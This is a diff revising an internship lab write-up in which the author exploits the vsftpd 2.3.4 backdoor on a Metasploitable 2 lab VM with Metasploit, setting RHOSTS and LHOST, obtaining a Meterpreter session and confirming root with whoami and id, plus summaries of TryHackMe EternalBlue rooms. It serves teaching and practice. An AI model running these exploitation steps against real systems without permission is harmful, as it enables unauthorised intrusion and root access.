@@ -1,125 +1,165 @@
-# Week 6, Task 1 — Metasploit: Exploit a Vulnerable Machine
+# Week 6, Task 1 — Metasploit: Exploiting a Vulnerable Machine
 
 <p align="center">
   <img src="https://img.shields.io/badge/Task-01-404040?style=flat-square&labelColor=6366F1" alt="Task 1" />
   <img src="https://img.shields.io/badge/Tool-Metasploit-404040?style=flat-square&labelColor=C00000" alt="Metasploit" />
-  <img src="https://img.shields.io/badge/Lab-Metasploitable%202-404040?style=flat-square&labelColor=238F89" alt="Metasploitable 2 lab" />
+  <img src="https://img.shields.io/badge/Lab-Metasploitable%202-404040?style=flat-square&labelColor=238F89" alt="Metasploitable 2" />
 </p>
 
 **Internship:** Ethical Hacking Internship, TechBiz Academy  
 **Author:** Collins Okike  
-**Attacker:** Kali Linux (10.0.0.3)  
-**Target:** Metasploitable 2 (10.0.0.6)  
-**Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
+**Attacker:** Kali Linux — `10.0.0.3`  
+**Target:** Metasploitable 2 — `10.0.0.6`  
+**Network:** VirtualBox NAT Network (`NatNetwork`)
 
 ## 1. Introduction
 
-For this task, I used the Metasploit Framework to exploit a known vulnerable service on my Metasploitable 2 lab machine. I searched for a module that matched the installed service, checked the options it required, configured the target and my Kali address, and ran the exploit. After it opened a session, I entered the system shell and used whoami and id to confirm what level of access I had gained.
+For this task I moved from identifying a vulnerable service to testing whether it could actually be used to gain access. I used Metasploit on Kali Linux to check a vulnerable FTP service running on my Metasploitable 2 virtual machine. The service was `vsftpd 2.3.4`, and the module I tested was the known backdoor module for that specific version.
 
-The main workflow I practised was search, use, show options, set and exploit. I also completed the TryHackMe Metasploit: Introduction room and the Blue box.
+I had already worked with Nmap in an earlier week, so I could connect the two exercises. Nmap helps me identify which services are running and what versions they report. Metasploit then gives me a way to load and test a matching exploit module. I kept this activity inside my VirtualBox lab, where the Kali attacker and Metasploitable target were on the same private NAT Network.
 
-## 2. Objectives
+The aim was not just to see a success message in Metasploit. I also wanted to confirm that a session had opened, enter the system shell and check which account the session was running as.
 
-- Learn the basic Metasploit Framework workflow.
-- Search for an exploit that matches a vulnerable service on Metasploitable 2.
-- Configure the required options, including RHOSTS and LHOST.
-- Run the exploit and check whether Metasploit opens a session.
-- Confirm the access level using whoami and id from the system shell.
-- Complete the related TryHackMe rooms and record what I learned.
+## 2. Lab setup and target details
 
-## 3. Lab Setup
-
-| Component | Details |
+| Item | Details |
 |---|---|
-| Attacker machine | Kali Linux — 10.0.0.3 |
-| Target machine | Metasploitable 2 — 10.0.0.6 |
-| Network | VirtualBox NAT Network (NatNetwork) |
-| Tool | Metasploit Framework (msfconsole) |
-| Vulnerability | vsftpd 2.3.4 backdoor (CVE-2011-2523) on FTP port 21 |
-| Exploit module | exploit/unix/ftp/vsftpd_234_backdoor |
+| Attacking machine | Kali Linux, `10.0.0.3` |
+| Target machine | Metasploitable 2, `10.0.0.6` |
+| Network | VirtualBox `NatNetwork`, `10.0.0.0/24` |
+| Target service | FTP on TCP port `21` |
+| Service version | `vsftpd 2.3.4` |
+| Exploit module | `exploit/unix/ftp/vsftpd_234_backdoor` |
+| Vulnerability reference | CVE-2011-2523 |
+| Tool | Metasploit Framework (`msfconsole`) |
 
-## 4. Key Terms I Used
+The vulnerable FTP service was part of the intentionally insecure Metasploitable 2 machine. I did not run this against a public FTP server or a system outside my lab.
 
-| Term | What I understood |
+## 3. Understanding the Metasploit terms
+
+Before running the module, I reviewed what the main terms meant. This made the options easier to understand instead of treating them as commands I had to memorise.
+
+| Term | What it means in this exercise |
 |---|---|
-| Metasploit Framework | A penetration-testing framework that packages exploit, payload and auxiliary modules. |
-| msfconsole | The command-line interface I used to search for and run modules. |
-| Exploit | Code that takes advantage of a vulnerability in a service to gain access. |
-| Payload | Code that runs on the target after the exploit succeeds, such as a command shell or Meterpreter session. |
-| RHOSTS | The target IP address for the module. |
-| LHOST | The address of my attacking machine that the target connects back to when a reverse connection is used. |
-| Session | The active connection Metasploit opens after a successful exploit. |
+| **Module** | A component in Metasploit for a particular task, such as an exploit, scanner or auxiliary check. |
+| **Exploit** | Code that takes advantage of a vulnerability in the target service. |
+| **Payload** | The code or action that runs after exploitation succeeds. In this lab, the result was a session back to Kali. |
+| **RHOSTS** | The remote host or target address. I set this to the Metasploitable 2 IP. |
+| **LHOST** | The local address the target should connect back to for a reverse connection. I set this to Kali's lab IP. |
+| **Session** | The active connection Metasploit creates after a successful exploit. |
+| **Meterpreter** | A Metasploit session interface that provides commands for interacting with a compromised machine. |
 
-## 5. How the Metasploit Workflow Works
+The two IP settings are easy to mix up. `RHOSTS` is the machine I am testing, while `LHOST` is my own Kali machine. In a reverse connection, the target needs to reach the attacker's listening address, so using the wrong local interface can prevent the session from connecting.
 
-The workflow I followed was to search for a module by service or vulnerability, load it with use, inspect what it needs with show options, set the required values and then run exploit. If the exploit succeeds, Metasploit opens a session that I can interact with. The steps are consistent across different modules, even though each exploit can need different options.
+## 4. Running the Metasploit workflow
 
-## 6. Step 1 — Starting msfconsole and Searching for an Exploit
+### 4.1 Start Metasploit and search for the service
 
-I opened Metasploit on Kali and searched for a module matching the vsftpd service on Metasploitable 2:
+I opened a terminal in Kali and started the Metasploit console:
 
-~~~bash
+```bash
 msfconsole
+```
+
+At the Metasploit prompt, I searched for modules related to the FTP service:
+
+```text
 search vsftpd
-~~~
+```
 
-The results included exploit/unix/ftp/vsftpd_234_backdoor, described as **VSFTPD 2.3.4 Backdoor Command Execution** with an excellent rank. It showed Linux/Unix Command and Backdoor Command Shell as targets.
+The search returned `exploit/unix/ftp/vsftpd_234_backdoor`, described as **VSFTPD 2.3.4 Backdoor Command Execution**. The result showed an excellent module rank and listed Linux/Unix command and backdoor command-shell targets.
 
-![msfconsole showing the search results for the vsftpd 2.3.4 backdoor module](screenshots/01-msfconsole-search-vsftpd.webp)
+![Metasploit search results for the vsftpd 2.3.4 backdoor module](screenshots/01-msfconsole-search-vsftpd.webp)
 
-The module matched the exact vsftpd version running on Metasploitable 2, which I had already identified during my Nmap scan in Week 3. This made it the module I chose for the practical.
+The version in the module name matched the version running on the target. That match mattered: I should not select an exploit simply because the service name looks similar. I first need to compare the detected product and version with what the module is designed to affect. The search result gave me a candidate module; the next step was to inspect its options before running it.
 
-## 7. Step 2 — Configuring and Running the Exploit
+### 4.2 Load the module and inspect its options
 
-I loaded the module, checked its options and set the target address. My first attempt failed because I had not set LHOST. This module uses a reverse connection, so it also needed my Kali address.
+I loaded the module and displayed the required settings:
 
-~~~text
+```text
 use exploit/unix/ftp/vsftpd_234_backdoor
 show options
+```
+
+`use` changed the Metasploit prompt to the selected exploit module. `show options` displayed the settings that needed to be supplied. I then set the target address:
+
+```text
 set RHOSTS 10.0.0.6
+```
+
+My first attempt stopped at the validation stage because I had not set `LHOST`. Metasploit reported: `One or more options failed to validate: LHOST.` This was useful because it showed that the module needed a local callback address as well as the target address. I checked the network details I had recorded for the lab and set Kali's address:
+
+```text
 set LHOST 10.0.0.3
+```
+
+### 4.3 Run the exploit and read the result
+
+After configuring both addresses, I ran the module again:
+
+```text
 exploit
-~~~
+```
 
-**What happened:** The first run returned **One or more options failed to validate: LHOST**. After I set LHOST to 10.0.0.3, Metasploit started the reverse TCP handler on 10.0.0.3:4444. The FTP banner identified vsftpd 2.3.4, the backdoor was spawned, and Metasploit opened Meterpreter session 1 from 10.0.0.3:4444 to 10.0.0.6:38117.
+Metasploit started a reverse TCP handler on `10.0.0.3:4444`. The FTP banner identified the service as `vsFTPd 2.3.4`; the module reported that the target appeared vulnerable and that the backdoor had been spawned. It then opened Meterpreter session 1, showing the connection from Kali to the target.
 
-![Metasploit show options, RHOSTS and LHOST settings, and the successful exploit output](screenshots/02-msfconsole-options-rhosts-lhost-exploit.webp)
+![Metasploit options, RHOSTS and LHOST settings, and successful exploit output](screenshots/02-msfconsole-options-rhosts-lhost-exploit.webp)
 
-This confirmed that the exploit opened a live session against the target and gave me code execution through the vsftpd backdoor.
+This was the point where I knew the exploit had progressed beyond a version match. A session had actually opened. The handler was listening on Kali, and the target connected back to it. I still needed to confirm what access the session provided, because a session opening does not by itself tell me which user privileges I have.
 
-## 8. Step 3 — Confirming Access
+## 5. Confirming the level of access
 
-I wanted to confirm that the session gave me a real shell and check the account level. At first, whoami and id did not work directly at the Meterpreter prompt because they are system-shell commands. I used shell first, then ran the commands:
+The session opened in Meterpreter. I initially tried to use normal Linux commands directly, but `whoami` and `id` are not Meterpreter commands. I switched from the Meterpreter interface to the target's operating-system shell with:
 
-~~~text
+```text
 shell
+```
+
+Then I ran:
+
+```bash
 whoami
 id
-~~~
+```
 
-whoami returned root, and id returned uid=0(root) gid=0(root). This showed that I had a working shell as root, with no separate privilege-escalation step needed.
+The shell returned `root` for `whoami`. The `id` command returned `uid=0(root) gid=0(root)`, confirming that the session was running with the root account's privileges.
 
-![whoami and id output confirming root access on Metasploitable 2](screenshots/03-meterpreter-shell-root-whoami-id.webp)
+![Target shell showing whoami as root and uid 0 from id](screenshots/03-meterpreter-shell-root-whoami-id.webp)
 
-## 9. TryHackMe Rooms
+This distinction is important. `whoami` tells me the current username, while `id` also shows the numeric user and group identifiers. On Linux, UID `0` is the root account. The result therefore confirmed that this particular vulnerable service gave me root-level command execution without needing a separate privilege-escalation step.
 
-### 9.1 Metasploit: Introduction (Compulsory)
+## 6. TryHackMe practice
 
-I completed the TryHackMe Metasploit: Introduction room. It covered searching for a module, loading it, checking and setting its options, choosing a payload, and running the exploit. I also learned the difference between a vulnerability, an exploit and a payload, as well as the difference between inline (single) and staged payloads. I practised the workflow on the room's MS17-010 EternalBlue example, then used the same general process against the different vsftpd vulnerability in my Metasploitable 2 lab.
+I also completed two TryHackMe exercises that helped me understand how Metasploit is used in different situations.
+
+### 6.1 Metasploit: Introduction
+
+In this room I practised the normal Metasploit sequence: search for a module, load it with `use`, inspect it with `show options`, configure the required values and run it. The room used the MS17-010 EternalBlue vulnerability as its example. I also learned how payload names indicate whether a payload is staged or delivered as a single unit.
 
 ![TryHackMe Metasploit Introduction room completed](screenshots/04-tryhackme-metasploit-introduction-completed.webp)
 
-### 9.2 Blue (Compulsory Extra Box)
+What helped me most was seeing that the same console workflow can be used for different services and vulnerabilities. The exact module and options change, but the habit of checking the module details before running it stays the same.
 
-I also completed Blue. This box used the EternalBlue exploit to progress from an initial shell to a cracked password hash and three flags. I practised converting a shell to Meterpreter, running getsystem, and migrating into a process already running as SYSTEM. It helped me understand that a session's privilege level and the privilege level of a process can differ until I migrate into the right process.
+### 6.2 Blue
+
+The Blue room gave me more practice with the EternalBlue/SMBv1 attack path on a Windows target. I worked through the process of gaining an initial session, moving to Meterpreter, checking privileges and continuing with post-exploitation tasks. The exercise also covered credential recovery and locating the flags in the lab.
 
 ![TryHackMe Blue room completed](screenshots/05-tryhackme-blue-completed.webp)
 
-## 10. Problems I Faced and How I Fixed Them
+It helped me understand that exploitation is not the end of a penetration test. After an initial session, a tester still needs to establish what access was gained, what systems or data that access exposes, and what evidence is appropriate to collect. In a real engagement, these actions must remain within the agreed scope.
 
-- **Exploit validation failed because LHOST was missing.** I had only set RHOSTS, so Metasploit refused to run the reverse connection. I set LHOST to my Kali IP (10.0.0.3) and ran the exploit again.
-- **whoami and id were not recognised at the Meterpreter prompt.** I had to run shell first to enter the underlying system shell. Both commands then worked and showed root.
+## 7. Problems I faced and how I fixed them
 
-## 11. Conclusion
+| Problem | What happened | How I resolved it |
+|---|---|---|
+| Missing `LHOST` | The first run failed validation with an LHOST error. | I set `LHOST` to Kali's lab address, `10.0.0.3`, and ran the module again. |
+| Linux commands were not recognised at the Meterpreter prompt | `whoami` and `id` were treated as unknown Meterpreter commands. | I used `shell` to enter the system shell, then ran the commands there. |
 
-This task moved me from reading about Metasploit to using it from beginning to end: finding a module for a known vulnerability, configuring it, running it and confirming access with whoami and id. Repeating the exploit-to-shell process in the Blue room, this time with Windows and EternalBlue, showed me that the Metasploit workflow stays similar even when the operating system and vulnerability change. The main lesson I took from both exercises is how quickly an unpatched or deliberately vulnerable service can lead to a full shell, which is why patching and version management matter.
+I learned not to assume that every prompt is a normal Linux terminal. The command set depends on which interface I am currently using. I also learned to read the module's validation messages instead of repeatedly running the same command without checking the missing setting.
+
+## 8. Conclusion
+
+This task gave me practical experience with the full Metasploit process, from searching for a module that matched a service version to confirming the privileges of the resulting session. I used `RHOSTS` for the target and `LHOST` for my Kali callback address, corrected the missing LHOST setting, and confirmed root access with both `whoami` and `id`.
+
+The main lesson I took from this exercise is that a successful exploit needs to be verified. The session message showed that Metasploit connected, but the shell and identity checks showed what level of access I actually obtained. It also reinforced why vulnerable services should be patched or removed, why exposed services need to be reviewed, and why exploitation should only be carried out against systems for which permission has been given.
